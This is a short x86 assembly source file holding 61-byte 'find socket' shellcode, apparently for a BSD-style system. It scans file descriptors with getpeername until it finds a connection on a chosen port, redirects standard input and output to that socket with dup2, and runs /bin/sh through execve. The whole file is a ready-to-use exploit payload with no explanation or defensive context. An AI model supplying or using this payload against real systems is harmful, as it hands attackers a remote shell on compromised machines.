.globl start

start:

# 61 bytes

fndsockcode:
    xorl    %eax,%eax
    pushl   %eax
    movl    %esp,%edi

    pushl   $0x10
    pushl   %esp
    pushl   %edi
    pushl   %eax
    pushl   %eax

0:
    popl    %eax
    popl    %eax
    incl    %eax
    pushl   %eax
    pushl   %eax
    pushl   $0x1f
    popl    %eax
    int     $0x80

    cmpw    $0x5c11,0x02(%edi)
    jne     0b

    pushl   %eax

1:
    pushl   $0x5a
    popl    %eax
    int     $0x80

    decl    -0x10(%edi)
    jns     1b

shellcode:
#    xorl    %eax,%eax
#    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %esp
    pushl   %esp
    pushl   %ebx
    pushl   %eax
    movb    $0x3b,%al
    int     $0x80
